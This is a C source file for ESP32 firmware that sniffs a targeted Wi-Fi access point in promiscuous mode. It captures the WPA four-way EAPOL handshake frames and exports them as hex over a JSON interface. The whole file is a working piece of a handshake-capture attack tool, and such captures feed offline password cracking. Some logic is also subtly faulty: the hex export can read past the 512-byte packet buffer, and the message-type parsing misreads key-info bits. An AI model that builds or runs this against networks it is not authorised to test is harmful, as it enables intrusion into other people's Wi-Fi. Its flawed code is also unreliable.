#include "handshake_sniffer.h"
#include "esp_wifi.h"
#include "esp_log.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"
#include <string.h>
#include <sys/time.h>

static const char *TAG = "SNIFFER";

static wifi_ap_info_t g_target;
static bool g_running = false;
static SemaphoreHandle_t g_mutex = NULL;

#define MAX_EAPOL 50
typedef struct {
    uint8_t data[512];
    uint16_t length;
    uint8_t type;
} eapol_packet_t;

static eapol_packet_t g_packets[MAX_EAPOL];
static int g_packet_count = 0;

static uint32_t get_timestamp(void) {
    struct timeval tv;
    gettimeofday(&tv, NULL);
    return tv.tv_sec * 1000000 + tv.tv_usec;
}

static uint8_t parse_eapol_type(const uint8_t *payload, uint16_t length) {
    for (int i = 0; i < length - 10; i++) {
        if (payload[i] == 0xAA && payload[i+1] == 0xAA && payload[i+2] == 0x03) {
            const uint8_t *eapol = payload + i + 8;
            if (length - (i + 8) < 5) return 0;
            
            if (eapol[1] == 3 && length - (i + 8) >= 7) {
                uint16_t key_info = (eapol[5] << 8) | eapol[6];
                uint8_t key_ack = (key_info >> 5) & 1;
                uint8_t key_mic = (key_info >> 6) & 1;
                
                if (key_ack && !key_mic) return 1;
                if (key_mic && !key_ack) return 2;
                if (key_ack && key_mic && (key_info & 0x40)) return 3;
                if (!key_ack && !key_mic) return 4;
            }
        }
    }
    return 0;
}

static void sniffer_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (!g_running) return;
    
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    uint8_t *payload = pkt->payload;
    uint16_t length = pkt->rx_ctrl.sig_len;
    
    if (type != WIFI_PKT_DATA || length < 24) return;
    
    bool match = (memcmp(payload + 4, g_target.bssid, 6) == 0) ||
                 (memcmp(payload + 10, g_target.bssid, 6) == 0) ||
                 (memcmp(payload + 16, g_target.bssid, 6) == 0);
    if (!match) return;
    
    for (int i = 24; i < length - 2; i++) {
        if (payload[i] == 0x88 && payload[i+1] == 0x8E) {
            uint8_t msg_type = parse_eapol_type(payload, length);
            
            if (msg_type >= 1 && msg_type <= 4) {
                xSemaphoreTake(g_mutex, portMAX_DELAY);
                
                if (g_packet_count < MAX_EAPOL) {
                    memcpy(g_packets[g_packet_count].data, payload, length > 512 ? 512 : length);
                    g_packets[g_packet_count].length = length;
                    g_packets[g_packet_count].type = msg_type;
                    g_packet_count++;
                    g_eapol_count = g_packet_count;
                    
                    if (msg_type == 1) g_got_msg1 = true;
                    if (msg_type == 2) g_got_msg2 = true;
                    if (msg_type == 3) g_got_msg3 = true;
                    if (msg_type == 4) g_got_msg4 = true;
                    
                    ESP_LOGI(TAG, "Captured Message %d (Total: %d)", msg_type, g_packet_count);
                }
                
                xSemaphoreGive(g_mutex);
            }
            break;
        }
    }
}

void handshake_sniffer_init(wifi_ap_info_t *target) {
    memcpy(&g_target, target, sizeof(wifi_ap_info_t));
    g_mutex = xSemaphoreCreateMutex();
    g_packet_count = 0;
    g_eapol_count = 0;
    g_got_msg1 = g_got_msg2 = g_got_msg3 = g_got_msg4 = false;
    
    esp_wifi_stop();
    esp_wifi_deinit();
    
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_NULL));
    ESP_ERROR_CHECK(esp_wifi_start());
    
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous(true));
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous_rx_cb(sniffer_cb));
    ESP_ERROR_CHECK(esp_wifi_set_channel(target->channel, WIFI_SECOND_CHAN_NONE));
    
    wifi_promiscuous_filter_t filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_DATA
    };
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous_filter(&filter));
    esp_wifi_set_ps(WIFI_PS_NONE);
    
    g_sniffer_running = false;
    ESP_LOGI(TAG, "Sniffer ready on channel %d, target: %s", target->channel, target->ssid);
}

void handshake_sniffer_start(void) {
    g_running = true;
    g_sniffer_running = true;
    ESP_LOGI(TAG, "Sniffer started");
}

void handshake_sniffer_stop(void) {
    g_running = false;
    g_sniffer_running = false;
    ESP_LOGI(TAG, "Sniffer stopped");
}

bool handshake_sniffer_is_complete(void) {
    return g_got_msg1 && g_got_msg2 && g_got_msg3 && g_got_msg4;
}

void handshake_sniffer_get_status(char *buffer, int buffer_size) {
    snprintf(buffer, buffer_size, 
             "{\"running\":%s,\"packets\":%d,\"msg1\":%s,\"msg2\":%s,\"msg3\":%s,\"msg4\":%s,\"complete\":%s}",
             g_running ? "true" : "false",
             g_packet_count,
             g_got_msg1 ? "true" : "false",
             g_got_msg2 ? "true" : "false",
             g_got_msg3 ? "true" : "false",
             g_got_msg4 ? "true" : "false",
             handshake_sniffer_is_complete() ? "true" : "false");
}

void handshake_sniffer_get_hex_data(char *buffer, int buffer_size) {
    int offset = 0;
    xSemaphoreTake(g_mutex, portMAX_DELAY);
    
    for (int i = 0; i < g_packet_count && offset < buffer_size - 100; i++) {
        offset += snprintf(buffer + offset, buffer_size - offset, 
                          "{\"type\":%d,\"hex\":\"", g_packets[i].type);
        for (int j = 0; j < g_packets[i].length && offset < buffer_size - 10; j++) {
            offset += snprintf(buffer + offset, buffer_size - offset, 
                              "%02x", g_packets[i].data[j]);
        }
        offset += snprintf(buffer + offset, buffer_size - offset, "\"}%s", 
                          (i < g_packet_count - 1) ? "," : "");
    }
    
    xSemaphoreGive(g_mutex);
}
